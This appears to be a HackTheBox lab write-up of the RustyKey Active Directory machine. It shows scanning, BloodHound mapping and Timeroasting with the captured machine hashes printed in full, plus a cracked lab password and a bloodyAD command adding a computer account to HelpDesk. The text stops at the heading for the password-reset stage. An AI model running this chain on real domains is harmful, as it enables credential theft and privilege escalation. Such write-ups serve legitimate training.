---
title: "RustyKey HackTheBox |TimeRoasting & RBCD & DACL & Protected Users"
description: "And here we go again it’s Maverick back from the dark shadows,embarking onanother hard Active Directory machine write-up; I swear I said the last one would be the final time, but clearly my love for A"
pubDate: 2025-11-15
tags: ["Sharphound"]
author: "Mohamed Eletrepy (maverick)"
readingTime: 27
coverImage: "https://cdn-images-1.medium.com/max/800/1*GhQds1zADNUwcBLegWYXDw.png"
---

---

![](https://cdn-images-1.medium.com/max/800/1*GhQds1zADNUwcBLegWYXDw.png)

### RustyKey HackTheBox |TimeRoasting & RBCD & DACL & Protected Users

And here we go again it’s Maverick back from the dark shadows, **embarking on** another hard Active Directory machine write-up; I swear I said the last one would be the final time, but clearly my love for AD and hacking Domain Controllers won’t let me retire. This machine is a perfect chain and even includes some Windows exploitation like COM, which is advanced to exploit nowadays but still one of the cleanest persistence techniques in real red-team ops. Keep your eyes on my Anubis (*credlogger*) because I don’t just think in commands I think in the *way* and honestly, I didn’t solve this in one active shot because the HTB spoilers were everywhere and this machine felt like pure chaos with all the errors and bugs I hit. Anyway… are you ready? Let’s gooooooo.

![](https://cdn-images-1.medium.com/max/800/1*SHVCYKfk04yg6iD-I8E3uQ.png)

*It’s just Anubis saying hi to those who don’t know I’m an Egyptian pharaoh.*

As usual, we start with scanning to see which services and ports are running on the target.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/RustyKey]  
└─# nmap -sCV -Pn -oN nmap 10.10.11.75  
  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-09 17:34 EET  
Nmap scan report for 10.10.11.75  
Host is up (0.28s latency).  
Not shown: 988 closed tcp ports (reset)  
PORT STATE SERVICE VERSION  
53/tcp open domain Simple DNS Plus  
88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-11-09 23:34:59Z)  
135/tcp open msrpc Microsoft Windows RPC  
139/tcp open netbios-ssn Microsoft Windows netbios-ssn  
389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)  
445/tcp open microsoft-ds?  
464/tcp open kpasswd5?  
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0  
636/tcp open tcpwrapped  
3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)  
3269/tcp open tcpwrapped  
5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-server-header: Microsoft-HTTPAPI/2.0  
|_http-title: Not Found  
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
| smb2-time:  
| date: 2025-11-09T23:35:19  
|_ start_date: N/A  
| smb2-security-mode:  
| 3:1:1:  
|_ Message signing enabled and required  
|_clock-skew: 8h00m37s  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 46.95 seconds
```

![](https://cdn-images-1.medium.com/max/1200/1*UWuUEyMHeZhVOPp5iFRjuQ.png)

*This is just a simple Python script to give me a clean table view of the running services because I love tables.*

I just wanna say there’s a lot we can do with scanning, like checking for [IDS/IPS](https://www.paloaltonetworks.com/cyberpedia/firewall-vs-ids-vs-ips) or seeing how security controls react, but we don’t have that here. In the future I’ll dive into that stuff, but for now we’re in a blackhat-style approach with an assume-breach mindset except we can’t actually log in. But if you were on a Windows machine and wanted to scan internally, you could use something like [*fscan*](https://github.com/shadow1ng/fscan/blob/main/README_EN.md).

As usual with Domain Controller stuff, there’s my love —> Kerberos, DNS, LDAP, Kpasswd, and RPC and since we’ve got creds, that means it’s time to start our journey into SMB and AD enumeration

![](https://cdn-images-1.medium.com/max/800/1*qbEIwN4fukHRnyIJ_oMBTw.png)

*Initial creds in assume breach go into my Anubis tool, which I use to keep credentials organized. You know how every machine throws tons of creds and hashes at us, so this is a clean way to keep track of them.*

But first there’s something you need to do to avoid bugs with the Domain Controller: create your hosts file, your *krb5 *file, and keep an eye on clock skew. I ran into a lot of errors because of that, so make sure to use `faketime -f ‘+8h’` on any command that authenticates through Kerberos

```bash
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/RustyKey]  
└─# nxc smb 10.10.11.75 --generate-hosts-file hostsfile  
SMB 10.10.11.75 445 dc [*] x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:None) (NTLM:False)  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/RustyKey]  
└─# cat hostsfile /etc/hosts | sponge /etc/hosts  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/RustyKey]  
└─# nxc smb 10.10.11.75 --generate-krb5-file krb5.conf  
SMB 10.10.11.75 445 dc [*] x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:None) (NTLM:False)  
SMB 10.10.11.75 445 dc [+] krb5 conf saved to: krb5.conf  
SMB 10.10.11.75 445 dc [+] Run the following command to use the conf file: export KRB5_CONFIG=krb5.conf  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/RustyKey]  
└─# export KRB5_CONFIG=krb5.conf  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/RustyKey]  
└─# sudo cp krb5.conf /etc/krb5.conf
```

First I tried to validate the creds, but NetExec gave me `STATUS_NOT_SUPPORTED`, so the first thing I thought was that the main authentication protocol might be Kerberos and that was right. You know we see this a lot in my VulnLab write-ups and chains.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/RustyKey]  
└─# nxc smb 10.10.11.75 -u rr.parker -p '8#t5HE8L!W3A'  
SMB 10.10.11.75 445 dc [*] x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:None) (NTLM:False)  
SMB 10.10.11.75 445 dc [-] rustykey.htb\rr.parker:8#t5HE8L!W3A STATUS_NOT_SUPPORTED  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/RustyKey]  
└─# nxc smb 10.10.11.75 -u rr.parker -p '8#t5HE8L!W3A' -k  
SMB 10.10.11.75 445 dc [*] x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:None) (NTLM:False)  
SMB 10.10.11.75 445 dc [-] rustykey.htb\rr.parker:8#t5HE8L!W3A KRB_AP_ERR_SKEW  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/RustyKey]  
└─# faketime -f '+8h' nxc smb 10.10.11.75 -u rr.parker -p '8#t5HE8L!W3A' -k  
  
SMB 10.10.11.75 445 dc [*] x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:None) (NTLM:False)  
SMB 10.10.11.75 445 dc [+] rustykey.htb\rr.parker:8#t5HE8L!W3A  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/RustyKey]  
└─# faketime -f '+8h' nxc smb 10.10.11.75 -u rr.parker -p '8#t5HE8L!W3A' -k --shares  
SMB 10.10.11.75 445 dc [*] x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:None) (NTLM:False)  
SMB 10.10.11.75 445 dc [+] rustykey.htb\rr.parker:8#t5HE8L!W3A  
SMB 10.10.11.75 445 dc [*] Enumerated shares  
SMB 10.10.11.75 445 dc Share Permissions Remark  
SMB 10.10.11.75 445 dc ----- ----------- ------  
SMB 10.10.11.75 445 dc ADMIN$ Remote Admin  
SMB 10.10.11.75 445 dc C$ Default share  
SMB 10.10.11.75 445 dc IPC$ READ Remote IPC  
SMB 10.10.11.75 445 dc NETLOGON READ Logon server share  
SMB 10.10.11.75 445 dc SYSVOL READ Logon server share
```

As you can see, there’s nothing special about the** SMB shares**, so let’s move on to **mapping the domain with BloodHound**. As usual (maybe I say “as usual” a lot since I write many AD writeups and feel like I’ve covered everything before), I always check and try multiple tools for that like [RustHound-CE](https://github.com/g0h4n/RustHound-CE), [BloodHound-CE](https://github.com/dirkjanm/BloodHound.py/tree/bloodhound-ce), and NetExec. Of course, there’s nothing better than the latest [Sharphound](https://github.com/SpecterOps/SharpHound/releases/tag/v2.8.0), but we can’t log in now, so make sure to try RustHound-CE, BloodHound-CE, and NetExec. Maybe you can see ***outbound control*** on some users with one tool, but with another you can’t. Okay, BloodHound is your eye in AD, and trust me, it’s always worth checking.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/RustyKey]  
└─# cargo install rusthound-ce  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/RustyKey]  
└─# rusthound-ce -d rustykey.htb -u rr.parker -p '8#t5HE8L!W3A'  
---------------------------------------------------  
Initializing RustHound-CE at 22:17:57 on 11/10/25  
Powered by @g0h4n_0  
Special thanks to NH-RED-TEAM  
---------------------------------------------------  
  
[2025-11-10T20:17:57Z INFO rusthound_ce] Verbosity level: Info  
[2025-11-10T20:17:57Z INFO rusthound_ce] Collection method: All  
[2025-11-10T20:17:57Z INFO rusthound_ce::ldap] Connected to RUSTYKEY.HTB Active Directory!  
[2025-11-10T20:17:57Z INFO rusthound_ce::ldap] Starting data collection...  
[2025-11-10T20:17:57Z INFO rusthound_ce::ldap] Ldap filter : (objectClass=*)  
[2025-11-10T20:17:59Z INFO rusthound_ce::ldap] All data collected for NamingContext DC=rustykey,DC=htb  
[2025-11-10T20:17:59Z INFO rusthound_ce::ldap] Ldap filter : (objectClass=*)  
[2025-11-10T20:18:03Z INFO rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=rustykey,DC=htb  
[2025-11-10T20:18:03Z INFO rusthound_ce::ldap] Ldap filter : (objectClass=*)  
[2025-11-10T20:18:06Z INFO rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=rustykey,DC=htb  
[2025-11-10T20:18:06Z INFO rusthound_ce::ldap] Ldap filter : (objectClass=*)  
[2025-11-10T20:18:06Z INFO rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=rustykey,DC=htb  
[2025-11-10T20:18:06Z INFO rusthound_ce::ldap] Ldap filter : (objectClass=*)  
[2025-11-10T20:18:07Z INFO rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=rustykey,DC=htb  
[2025-11-10T20:18:07Z INFO rusthound_ce::json::parser] Starting the LDAP objects parsing...  
[2025-11-10T20:18:07Z INFO rusthound_ce::json::parser] Parsing LDAP objects finished!  
[2025-11-10T20:18:07Z INFO rusthound_ce::json::checker] Starting checker to replace some values...  
[2025-11-10T20:18:07Z INFO rusthound_ce::json::checker] Checking and replacing some values finished!  
[2025-11-10T20:18:07Z INFO rusthound_ce::json::maker::common] 12 users parsed!  
[2025-11-10T20:18:07Z INFO rusthound_ce::json::maker::common] .//20251110221807_rustykey-htb_users.json created!  
[2025-11-10T20:18:07Z INFO rusthound_ce::json::maker::common] 66 groups parsed!  
[2025-11-10T20:18:07Z INFO rusthound_ce::json::maker::common] .//20251110221807_rustykey-htb_groups.json created!  
[2025-11-10T20:18:07Z INFO rusthound_ce::json::maker::common] 16 computers parsed!  
[2025-11-10T20:18:07Z INFO rusthound_ce::json::maker::common] .//20251110221807_rustykey-htb_computers.json created!  
[2025-11-10T20:18:07Z INFO rusthound_ce::json::maker::common] 10 ous parsed!  
[2025-11-10T20:18:07Z INFO rusthound_ce::json::maker::common] .//20251110221807_rustykey-htb_ous.json created!  
[2025-11-10T20:18:07Z INFO rusthound_ce::json::maker::common] 3 domains parsed!  
[2025-11-10T20:18:07Z INFO rusthound_ce::json::maker::common] .//20251110221807_rustykey-htb_domains.json created!  
[2025-11-10T20:18:07Z INFO rusthound_ce::json::maker::common] 2 gpos parsed!  
[2025-11-10T20:18:07Z INFO rusthound_ce::json::maker::common] .//20251110221807_rustykey-htb_gpos.json created!  
[2025-11-10T20:18:07Z INFO rusthound_ce::json::maker::common] 73 containers parsed!  
[2025-11-10T20:18:07Z INFO rusthound_ce::json::maker::common] .//20251110221807_rustykey-htb_containers.json created!  
  
RustHound-CE Enumeration Completed at 22:18:07 on 11/10/25! Happy Graphing!
```

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/RustyKey]  
└─# faketime -f '+8h' nxc ldap 10.10.11.75 -u rr.parker -p '8#t5HE8L!W3A' -k --bloodhound --dns-server 10.10.11.75 -c All  
LDAP 10.10.11.75 389 DC [*] None (name:DC) (domain:rustykey.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)  
LDAP 10.10.11.75 389 DC [+] rustykey.htb\rr.parker:8#t5HE8L!W3A  
LDAP 10.10.11.75 389 DC Resolved collection methods: container, group, session, acl, localadmin, objectprops, psremote, rdp, trusts, dcom  
LDAP 10.10.11.75 389 DC Using kerberos auth without ccache, getting TGT  
[01:50:52] ERROR Unhandled exception in computer dc.rustykey.htb processing: The NETBIOS connection with the remote host timed out. computers.py:268  
LDAP 10.10.11.75 389 DC Done in 0M 35S  
LDAP 10.10.11.75 389 DC Compressing output into /root/.nxc/logs/DC_10.10.11.75_2025-11-12_015012_bloodhound.zip
```

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/RustyKey]  
└─# faketime -f '+8h' bloodhound-ce-python --domain rustykey.htb --username 'rr.parker' --password '8#t5HE8L!W3A' --kerberos --nameserver 10.10.11.75 --dns-tcp --collection ALL --zip  
  
INFO: BloodHound.py for BloodHound Community Edition  
INFO: Found AD domain: rustykey.htb  
INFO: Getting TGT for user  
INFO: Connecting to LDAP server: dc.rustykey.htb  
INFO: Found 1 domains  
INFO: Found 1 domains in the forest  
INFO: Found 16 computers  
INFO: Connecting to LDAP server: dc.rustykey.htb  
INFO: Found 12 users  
INFO: Found 58 groups  
INFO: Found 2 gpos  
INFO: Found 10 ous  
INFO: Found 19 containers  
INFO: Found 0 trusts  
INFO: Starting computer enumeration with 10 workers  
INFO: Querying computer:  
INFO: Querying computer:  
INFO: Querying computer:  
INFO: Querying computer:  
INFO: Querying computer:  
INFO: Querying computer:  
INFO: Querying computer:  
INFO: Querying computer:  
INFO: Querying computer:  
INFO: Querying computer:  
INFO: Querying computer:  
INFO: Querying computer:  
INFO: Querying computer:  
INFO: Querying computer:  
INFO: Querying computer:  
INFO: Querying computer: dc.rustykey.htb  
WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.  
INFO: Done in 00M 33S  
INFO: Compressing output into 20251112015421_bloodhound.zip
```

Set the user `rr.parker` as owned and go to the shortest path to Domain Admins.

![](https://cdn-images-1.medium.com/max/1200/1*CbSSyTs4VSxaAb1iuo5ygw.png)

*Set the userrr.parkeras owned and go to the shortest path to Domain Admins.*

![](https://cdn-images-1.medium.com/max/1200/1*2PG0rpgZd10C8a7EzBptPg.png)

*map ou structure*

![](https://cdn-images-1.medium.com/max/1200/1*KdVcvW1hkcAtA512CtE0rA.png)

After logging into BloodHound, setting the user `rr.parker` as owned, and carefully checking some saved queries, you can see the **OU structure** is interesting. As shown in the Mermaid mindmap: the IT OU has 2 users (bb.morgan and GG.Anderson) and 5 computer machines; the Support OU has just ee.reed user and 5 computer machines too; but Finance has just one user and 5 computers as well. There’s something else interesting too in AD pentesting, we always want to see everything about passwords: like when passwords were created, when they were reset, and password policy too. We don’t just check for common attacks in AD; that’s not a professional approach. Good.

**back to bloodhound another some interesting screeenhots here**

![](https://cdn-images-1.medium.com/max/1200/1*Toof6bieg6Yl265SoBzy_w.png)

*After surfacing computers in the domain, IT-Computer3 is quite interesting because the password was reset 6.5 hours after creating the computer account. You may find this interesting since computer account passwords reset automatically after 30 days.*

As I said **before**, there are a lot of things you have to check, and in the roasting attack, there’s a new little child it’s TimeRoasting. The first time I heard about this attack, I saw it on the Twitter account of one of the NetExec authors, and there’s a common [*paper *](https://cybersecurity.bureauveritas.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)by [Secura](https://t.co/GERC5m3TdX) that explains this attack. If you don’t know, Secura is the author of the [Zerologon ](https://x.com/SecuraBV/status/1305450107391938561?s=20)vulnerability too, and there’s a module in NetExec to check for this attack. But if I could explain this attack in a simple way, I would say:

> “Timeroasting is a post-exploitation technique that extracts crackable NTLM hashes from Active Directory computer accounts by capturing authenticated NTP traffic. Domain-joined machines use their machine account password to sign NTP requests to domain controllers, allowing network-level attackers to obtain these hashes for offline cracking and credential reuse.”

![](https://cdn-images-1.medium.com/max/800/1*wnWgwocJ_9h2TAqoIGsqVw.png)

*how timeroasting attack works*

To perform this attack, we must send NTP requests to the DC using the computer RID, and the response will give us the NTLM hash for the computer account. Okay, there are some tools to do that: one is NetExec. I first saw this attack on Alex Neff’s Twitter, and there’s another tool by Secura, the author of the paper on this attack. And guess what? This attack doesn’t require any authentication with users.

I’ll try the NetExec [module](https://www.netexec.wiki/news/v1.4.0-smoothoperator#timeroasting-the-domain) for that. Another tip: for every single NetExec release, make sure to read the whole release notes, okay? This helps you stay up to date with this awesome Swiss Army knife.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/RustyKey]  
└─# faketime -f '+8h' nxc smb 10.10.11.75 -u rr.parker -p '8#t5HE8L!W3A' -k -M timeroast  
SMB 10.10.11.75 445 dc [*] x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:None) (NTLM:False)  
SMB 10.10.11.75 445 dc [+] rustykey.htb\rr.parker:8#t5HE8L!W3A  
TIMEROAST 10.10.11.75 445 dc [*] Starting Timeroasting...  
TIMEROAST 10.10.11.75 445 dc 1000:$sntp-ms$1c210a93ef2f4b7230063ecc9a8f563f$1c0111e900000000000a52434c4f434cecbcce4b65a99087e1b8428bffbfcd0aecbd3abf15889b44ecbd3abf1588de60  
TIMEROAST 10.10.11.75 445 dc 1103:$sntp-ms$8a136bcab2fe01852559c0598509b230$1c0111e900000000000a52434c4f434cecbcce4b66edd2d6e1b8428bffbfcd0aecbd3abfc6ed36cfecbd3abfc6ede54b  
TIMEROAST 10.10.11.75 445 dc 1104:$sntp-ms$b043b6c70596283f79b444337cad40c9$1c0111e900000000000a52434c4f434cecbcce4b688670c7e1b8428bffbfcd0aecbd3abfc886437becbd3abfc88684e9  
TIMEROAST 10.10.11.75 445 dc 1105:$sntp-ms$a6f9f936b29529bbe47f1ddfce5d3776$1c0111e900000000000a52434c4f434cecbcce4b662e62e9e1b8428bffbfcd0aecbd3abfca053ad2ecbd3abfca058149  
TIMEROAST 10.10.11.75 445 dc 1106:$sntp-ms$a197a56edd0ee2e50b22a817a3c22829$1c0111e900000000000a52434c4f434cecbcce4b67c06911e1b8428bffbfcd0aecbd3abfcb9751c0ecbd3abfcb9785c3  
TIMEROAST 10.10.11.75 445 dc 1107:$sntp-ms$e51fc3ff703163e786804fcfd5f8ba1c$1c0111e900000000000a52434c4f434cecbcce4b656460d2e1b8428bffbfcd0aecbd3abfcd53dcf6ecbd3abfcd5412a6  
TIMEROAST 10.10.11.75 445 dc 1118:$sntp-ms$64aca823c3a9562699c6aca48f9e6f77$1c0111e900000000000a52434c4f434cecbcce4b69286650e1b8428bffbfcd0aecbd3abfe0f70809ecbd3abfe0f751db  
TIMEROAST 10.10.11.75 445 dc 1119:$sntp-ms$3d4e00a2ecef5bcccfa4c2bd6a5e927c$1c0111e900000000000a52434c4f434cecbcce4b66b30eb5e1b8428bffbfcd0aecbd3abfe29a3b80ecbd3abfe29a92bd  
TIMEROAST 10.10.11.75 445 dc 1120:$sntp-ms$982d59dea342978f8b631cf628d6fee2$1c0111e900000000000a52434c4f434cecbcce4b6878c1b2e1b8428bffbfcd0aecbd3abfe45ff1d8ecbd3abfe4604ac3  
TIMEROAST 10.10.11.75 445 dc 1121:$sntp-ms$f2ea361b8c687b614f602eb737d8ffcf$1c0111e900000000000a52434c4f434cecbcce4b664c95dae1b8428bffbfcd0aecbd3abfe64c57c7ecbd3abfe64caf05  
==TIMEROAST== ==10.10====.====11.75== ==445== ==dc== ==1122====:$sntp-ms$ea5776524bd7018c4f399b07f5960e==56$1c0111e900000000000a52434c4f434cecbcce4b67f3ef50e1b8428bffbfcd0aecbd3abfe7f3bb4eecbd3abfe7f410de  
TIMEROAST 10.10.11.75 445 dc 1123:$sntp-ms$4669fd2f768e7276e30c4a89d5ebcc97$1c0111e900000000000a52434c4f434cecbcce4b65ac39afe1b8428bffbfcd0aecbd3abfe9831345ecbd3abfe9845564  
TIMEROAST 10.10.11.75 445 dc 1124:$sntp-ms$401c3e57f3df633b234212f4180f0d65$1c0111e900000000000a52434c4f434cecbcce4b667291ede1b8428bffbfcd0aecbd3abfea496edeecbd3abfea49b1fa  
TIMEROAST 10.10.11.75 445 dc 1125:$sntp-ms$694d54776c81719da8b1b2de335b3ce7$1c0111e900000000000a52434c4f434cecbcce4b67bce0c6e1b8428bffbfcd0aecbd3abfeb93b8afecbd3abfeb940936  
TIMEROAST 10.10.11.75 445 dc 1126:$sntp-ms$6ee5dec64fca8390c0a2d2325bd94478$1c0111e900000000000a52434c4f434cecbcce4b65404b49e1b8428bffbfcd0aecbd3abfed2fbf0aecbd3abfed2ffecb  
TIMEROAST 10.10.11.75 445 dc 1127:$sntp-ms$ee8243694ddf471b3aef9d1fcebe66f4$1c0111e900000000000a52434c4f434cecbcce4b66d939c2e1b8428bffbfcd0aecbd3abfeec88f50ecbd3abfeec8f24c  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/RustyKey]  
└─# vi nxc_output.txt  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/RustyKey]  
└─# awk '/^TIMEROAST/ {print $5}' nxc_output.txt > hashes.txt  
  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/RustyKey]  
└─# cat hashes.txt  
1103:$sntp-ms$8a136bcab2fe01852559c0598509b230$1c0111e900000000000a52434c4f434cecbcce4b66edd2d6e1b8428bffbfcd0aecbd3abfc6ed36cfecbd3abfc6ede54b  
1104:$sntp-ms$b043b6c70596283f79b444337cad40c9$1c0111e900000000000a52434c4f434cecbcce4b688670c7e1b8428bffbfcd0aecbd3abfc886437becbd3abfc88684e9  
1105:$sntp-ms$a6f9f936b29529bbe47f1ddfce5d3776$1c0111e900000000000a52434c4f434cecbcce4b662e62e9e1b8428bffbfcd0aecbd3abfca053ad2ecbd3abfca058149  
1106:$sntp-ms$a197a56edd0ee2e50b22a817a3c22829$1c0111e900000000000a52434c4f434cecbcce4b67c06911e1b8428bffbfcd0aecbd3abfcb9751c0ecbd3abfcb9785c3  
1107:$sntp-ms$e51fc3ff703163e786804fcfd5f8ba1c$1c0111e900000000000a52434c4f434cecbcce4b656460d2e1b8428bffbfcd0aecbd3abfcd53dcf6ecbd3abfcd5412a6  
1118:$sntp-ms$64aca823c3a9562699c6aca48f9e6f77$1c0111e900000000000a52434c4f434cecbcce4b69286650e1b8428bffbfcd0aecbd3abfe0f70809ecbd3abfe0f751db  
1119:$sntp-ms$3d4e00a2ecef5bcccfa4c2bd6a5e927c$1c0111e900000000000a52434c4f434cecbcce4b66b30eb5e1b8428bffbfcd0aecbd3abfe29a3b80ecbd3abfe29a92bd  
1120:$sntp-ms$982d59dea342978f8b631cf628d6fee2$1c0111e900000000000a52434c4f434cecbcce4b6878c1b2e1b8428bffbfcd0aecbd3abfe45ff1d8ecbd3abfe4604ac3  
1121:$sntp-ms$f2ea361b8c687b614f602eb737d8ffcf$1c0111e900000000000a52434c4f434cecbcce4b664c95dae1b8428bffbfcd0aecbd3abfe64c57c7ecbd3abfe64caf05  
1122:$sntp-ms$ea5776524bd7018c4f399b07f5960e56$1c0111e900000000000a52434c4f434cecbcce4b67f3ef50e1b8428bffbfcd0aecbd3abfe7f3bb4eecbd3abfe7f410de  
1123:$sntp-ms$4669fd2f768e7276e30c4a89d5ebcc97$1c0111e900000000000a52434c4f434cecbcce4b65ac39afe1b8428bffbfcd0aecbd3abfe9831345ecbd3abfe9845564  
1124:$sntp-ms$401c3e57f3df633b234212f4180f0d65$1c0111e900000000000a52434c4f434cecbcce4b667291ede1b8428bffbfcd0aecbd3abfea496edeecbd3abfea49b1fa  
1125:$sntp-ms$694d54776c81719da8b1b2de335b3ce7$1c0111e900000000000a52434c4f434cecbcce4b67bce0c6e1b8428bffbfcd0aecbd3abfeb93b8afecbd3abfeb940936  
1126:$sntp-ms$6ee5dec64fca8390c0a2d2325bd94478$1c0111e900000000000a52434c4f434cecbcce4b65404b49e1b8428bffbfcd0aecbd3abfed2fbf0aecbd3abfed2ffecb  
1127:$sntp-ms$ee8243694ddf471b3aef9d1fcebe66f4$1c0111e900000000000a52434c4f434cecbcce4b66d939c2e1b8428bffbfcd0aecbd3abfeec88f50ecbd3abfeec8f24c
```

Now we got the hashes with RID, it’s time to crack them. I’ll use hashcat — make sure to update your hashcat, I love v7. But there’s something different in those hashes: if you don’t add the `— user`flag, hashcat won’t crack them unless you remove the RID numbers. Okay.

![](https://cdn-images-1.medium.com/max/800/1*0iTzrndrX7BFkjTOjnHAvA.png)

![](https://cdn-images-1.medium.com/max/1200/1*BrmWkHNIdI6Xr3h3afPNyg.png)

*in my windows*

![](https://cdn-images-1.medium.com/max/1200/1*F1nxG9N-HdNp81rOcq00vw.png)

*And in my kali too*

Now you’ll see the hash belongs to RID 1125, and this RID is for IT-Computer3. Let’s try to validate that in NetExec.

![](https://cdn-images-1.medium.com/max/800/1*4Q4pU_821j4o936Rn7wGhg.png)

*goooooooooooood*

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/RustyKey]  
└─# faketime -f '+8h' nxc smb 10.10.11.75 -u IT-COMPUTER3$ -p 'Rusty88!' -k  
SMB 10.10.11.75 445 dc [*] x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:None) (NTLM:False)  
SMB 10.10.11.75 445 dc [+] rustykey.htb\IT-COMPUTER3$:Rusty88!  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/RustyKey]  
└─# faketime -f '+8h' nxc winrm 10.10.11.75 -u IT-COMPUTER3$ -p 'Rusty88!' -k  
[09:35:45] ERROR Invalid NTLM challenge received from server. This may indicate NTLM is not supported and nxc winrm only support NTLM currently winrm.py:59  
WINRM 10.10.11.75 5985 10.10.11.75 [*] None (name:10.10.11.75) (domain:None) (NTLM:False)  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/RustyKey]  
└─# faketime -f '+8h' nxc ldap 10.10.11.75 -u IT-COMPUTER3$ -p 'Rusty88!' -k  
LDAP 10.10.11.75 389 DC [*] None (name:DC) (domain:rustykey.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)  
LDAP 10.10.11.75 389 DC [+] rustykey.htb\IT-COMPUTER3$:Rusty88!
```

![](https://cdn-images-1.medium.com/max/800/1*kABb8sLWtiEi5yX0NKgHKA.png)

*Cred-logger#2*

In the next steps, if you don’t use other ingesters in BloodHound, you won’t find the right outbound control for the next users, so make sure, as I said before, to check other BloodHound ingesters.

After marking IT-**COMPUTER3 **as owned in BloodHound and reviewing its outbound control paths, we discover that it has **AddSelf** permission over the **HelpDesk **group. The **HelpDesk** group, in turn, has juicy outbound control over a large number of users belonging to multiple OUs, such as **IT**, **Support**, and **Finance**.

![](https://cdn-images-1.medium.com/max/800/1*HCJoUUF30BwPZei8Xu0jiQ.png)

*Being a member of theHelpDeskgroup means I haveForceChangePasswordover all those users.*

![](https://cdn-images-1.medium.com/max/800/1*OkyQZawOMTfONXJaR-Bcjw.png)

*BB.Morganis a member of theRemote Management Usersgroup, which means I can log in viaWinRM.*

![](https://cdn-images-1.medium.com/max/800/1*5kgsS7d5WhPo2LEvUjekdQ.png)

*GG.ANDERSONis a member of theRemote Management Usersgroup, which means I can log in viaWinRM.*

![](https://cdn-images-1.medium.com/max/800/1*u7XJEk9W-L5R9FWIJM7swA.png)

*EE.REEDis a member of theRemote Management Usersgroup, which means I can log in viaWinRM.*

![](https://cdn-images-1.medium.com/max/800/1*CgjoNtNMALHIOFlf_C7tkw.png)

*DD.Aliis not a lucky user, LOL.*

The attack path is as follows:

- As **IT-COMPUTER3$**, I can add myself to the **HelpDesk** group.
- From there, I can **force-change the password** for any user **except DD.Ali**.
- Once I change a user’s password, I can log in via **WinRM** using the new credentials.

![](https://cdn-images-1.medium.com/max/800/1*yhiugpng22Ufwyp_4aUymA.png)

*Off course i’m a mermaid nerd*

**Stage 1: Adding IT-COMPUTER3$ to the HelpDesk Group**

```bash
┌──(root㉿kali)-[/home/…/Desktop/htb/RustyKey/bh_ce]  
└─# bloodyAD -d rustykey.htb -k --host dc.rustykey.htb -u IT-COMPUTER3$ -p 'Rusty88!' add -h  
usage: bloodyAD add [-h] {computer,dcsync,dnsRecord,genericAll,groupMember,rbcd,shadowCredentials,uac,user} ...  
  
options:  
-h, --help show this help message and exit  
  
add commands:  
{computer,dcsync,dnsRecord,genericAll,groupMember,rbcd,shadowCredentials,uac,user}  
computer Add new computer  
dcsync Add DCSync right on domain to provided trustee (Requires to own or to have WriteDacl on domain object)  
dnsRecord This function adds a new DNS record into an AD environment.  
genericAll Give full control to trustee on target and descendants (you must own the object or have WriteDacl)  
groupMember Add a new member (user, group, computer) to group  
rbcd Add Resource Based Constraint Delegation for service on target, used to impersonate a user on target with service (Requires "Write" permission on target's msDS-AllowedToActOnBehalfOfOtherIdentity and  
Windows Server >= 2012)  
shadowCredentials Add Key Credentials to target (try to find a suitable DC if provided DC is below Win2016), and use those credentials to retrieve a TGT and a NT hash using PKINIT.  
uac Add property fl
```

```bash
┌──(root㉿kali)-[/home/…/Desktop/htb/RustyKey/bh_ce]  
└─# faketime -f '+8h' bloodyAD -d rustykey.htb -k --host dc.rustykey.htb -u IT-COMPUTER3$ -p 'Rusty88!' add groupMember Helpdesk 'IT-COMPUTER3$'  
[+] IT-COMPUTER3$ added to Helpdesk
```
**Stage 2: Change Password of Any of BB.Morgan, GG.Anderson, or EE.Reed**

